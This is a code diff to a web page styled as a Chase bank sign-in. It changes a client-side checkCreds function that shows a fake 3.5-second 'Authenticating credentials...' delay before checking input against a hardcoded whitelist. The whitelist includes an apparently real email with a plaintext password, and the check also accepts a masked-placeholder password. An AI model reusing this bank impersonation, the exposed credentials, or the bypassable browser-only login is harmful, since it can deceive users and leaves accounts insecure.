@@ -1897,7 +1897,7 @@
                     <span class="login-error-text">Please tell us your username and password.</span>
                 </div>
 
-                <form id="form-landing-login" onsubmit="checkCreds(event)">
+                <form id="form-landing-login" novalidate onsubmit="checkCreds(event); return false;">
                     <div class="login-field">
                         <label>Account Type</label>
                         <select id="login-acc-type">
@@ -2208,13 +2208,13 @@
         <div style="flex:1; display:flex; align-items:center; justify-content:center; padding:40px 16px;">
             <div class="chase-login-card-skyline">
                 <!-- Red Alert Warning Header -->
-                <div id="login-error-alert"
+                <div class="login-error-alert" id="login-error-alert"
                     style="color:#9f1239; background:#fff1f2; border:1px solid #fecdd3; border-radius:6px; padding:10px 12px; font-size:13px; font-weight:600; margin-bottom:18px; display:none; align-items:flex-start; gap:8px; line-height:1.4;">
                     <span style="font-size:15px;">⚠️</span>
-                    <span id="login-error-text">Please tell us your username and password.</span>
+                    <span id="login-error-text" class="login-error-text">Please tell us your username and password.</span>
                 </div>
 
-                <form onsubmit="checkCreds(event)">
+                <form id="form-skyline-login" novalidate onsubmit="checkCreds(event); return false;">
                     <!-- Underlined Username Field -->
                     <div class="chase-input-group">
                         <label for="input-username">Username</label>
@@ -2240,7 +2240,7 @@
                     </div>
 
                     <!-- Solid Blue Primary Sign In Button -->
-                    <button type="submit" class="btn-chase-primary" id="btn-login-submit"
+                    <button type="submit" class="btn-chase-primary" id="btn-skyline-submit" onclick="checkCreds(event)"
                         style="background:#117aca; border:none; width:100%; padding:13px; border-radius:4px; font-size:15px; font-weight:700; color:white; cursor:pointer;">
                         Sign in
                     </button>
@@ -3476,53 +3476,62 @@
         }
 
 
+        let isAuthenticating = false;
+
         function checkCreds(event) {
             if (event) {
                 event.preventDefault();
                 event.stopPropagation();
             }
 
-            // Identify which form or button triggered this action
-            const form = (event && event.target) ? (event.target.tagName === 'FORM' ? event.target : event.target.closest('form')) : null;
+            if (isAuthenticating) return false;
 
+            // Determine if active view or event target is the dedicated Skyline login page
+            const form = (event && event.target) ? (event.target.tagName === 'FORM' ? event.target : event.target.closest('form')) : null;
+            const isSkylineVisible = document.getElementById('view-chase-login') && !document.getElementById('view-chase-login').classList.contains('hidden');
+            const isSkylineTarget = (form && form.id === 'form-skyline-login') || isSkylineVisible;
+
+            // Resolve inputs by persistent IDs (prevents null when password type toggles between text/password)
             let usernameInput = null;
             let passwordInput = null;
             let submitBtn = null;
             let errorAlert = null;
+            let errorText = null;
 
-            if (form) {
-                usernameInput = form.querySelector('input[type="text"]');
-                passwordInput = form.querySelector('input[type="password"]');
-                submitBtn = form.querySelector('button[type="submit"]') || form.querySelector('button');
-                errorAlert = form.querySelector('.login-error-alert') || form.closest('.chase-login-card, .chase-login-card-skyline').querySelector('.login-error-alert, #login-error-alert');
+            if (isSkylineTarget) {
+                usernameInput = document.getElementById('input-username');
+                passwordInput = document.getElementById('input-password');
+                submitBtn = document.getElementById('btn-skyline-submit') || (form ? form.querySelector('button[type="submit"]') : null);
+                errorAlert = document.getElementById('login-error-alert');
+                errorText = document.getElementById('login-error-text');
             } else {
-                // Determine active visible view
-                const activeView = (document.getElementById('view-chase-login') && !document.getElementById('view-chase-login').classList.contains('hidden'))
-                    ? document.getElementById('view-chase-login')
-                    : document.getElementById('view-chase-landing');
-
-                usernameInput = activeView.querySelector('input[type="text"]');
-                passwordInput = activeView.querySelector('input[type="password"]');
-                submitBtn = activeView.querySelector('button[type="submit"]') || activeView.querySelector('#btn-login-submit');
-                errorAlert = activeView.querySelector('.login-error-alert, #login-error-alert');
+                usernameInput = document.getElementById('input-landing-username');
+                passwordInput = document.getElementById('input-landing-password');
+                submitBtn = document.getElementById('btn-login-submit') || (form ? form.querySelector('button[type="submit"]') : null);
+                errorAlert = document.getElementById('landing-login-error');
+                errorText = errorAlert ? errorAlert.querySelector('.login-error-text') : null;
             }
 
-            const errorText = errorAlert ? (errorAlert.querySelector('.login-error-text, #login-error-text') || errorAlert.querySelector('span:last-child')) : null;
+            // Immediately hide all error alerts during the loading state
+            const allErrors = document.querySelectorAll('.login-error-alert, #login-error-alert, #landing-login-error');
+            allErrors.forEach(el => el.style.display = 'none');
+
+            // Gather buttons to animate
+            const buttonsToAnimate = [submitBtn, document.getElementById('btn-skyline-submit'), document.getElementById('btn-login-submit')].filter(Boolean);
+
+            buttonsToAnimate.forEach(btn => {
+                btn.innerHTML = '<span class="btn-spinner"></span> Authenticating credentials...';
+                btn.style.opacity = '0.85';
+                btn.style.pointerEvents = 'none';
+                btn.disabled = true;
+            });
+
+            isAuthenticating = true;
 
             const username = usernameInput ? usernameInput.value.trim() : '';
             const password = passwordInput ? passwordInput.value.trim() : '';
 
-            console.log('[Auth Validation] checkCreds triggered for:', { username, formId: form ? form.id : 'unknown' });
-
-            // Clear any active error message while loading
-            if (errorAlert) errorAlert.style.display = 'none';
-
-            // Show loading spinner on active submit button
-            if (submitBtn) {
-                submitBtn.innerHTML = '<span class="btn-spinner"></span> Authenticating credentials...';
-                submitBtn.style.opacity = '0.85';
-                submitBtn.disabled = true;
-            }
+            console.log('[Auth Validation] checkCreds starting 3.5s authentication delay for:', { username, isSkylineTarget });
 
             // Valid accounts database
             const validCreds = [
@@ -3533,15 +3542,19 @@
                 { username: 'christopherlooker@yahoo.com', password: '#LookerAnn007' }
             ];
 
-            // Wait 3.5 seconds simulating authentication check
+            // Wait full 3.5 seconds before reporting ANY status (error or success)
             setTimeout(() => {
-                // Restore button state
-                if (submitBtn) {
-                    submitBtn.innerHTML = 'Sign in';
-                    submitBtn.style.opacity = '1';
-                    submitBtn.disabled = false;
-                }
+                isAuthenticating = false;
 
+                // Restore submit buttons state
+                buttonsToAnimate.forEach(btn => {
+                    btn.innerHTML = 'Sign in';
+                    btn.style.opacity = '1';
+                    btn.style.pointerEvents = 'auto';
+                    btn.disabled = false;
+                });
+
+                // Check for empty fields
                 if (!username || !password) {
                     if (errorAlert) {
                         if (errorText) errorText.innerText = 'Please enter your username and password.';
@@ -3552,7 +3565,7 @@
                     return false;
                 }
 
-                // Validate credentials
+                // Validate credentials against whitelist
                 const isValid = validCreds.some(cred =>
                     cred.username.toLowerCase() === username.toLowerCase() &&
                     (cred.password === password || password === '••••••••••••')
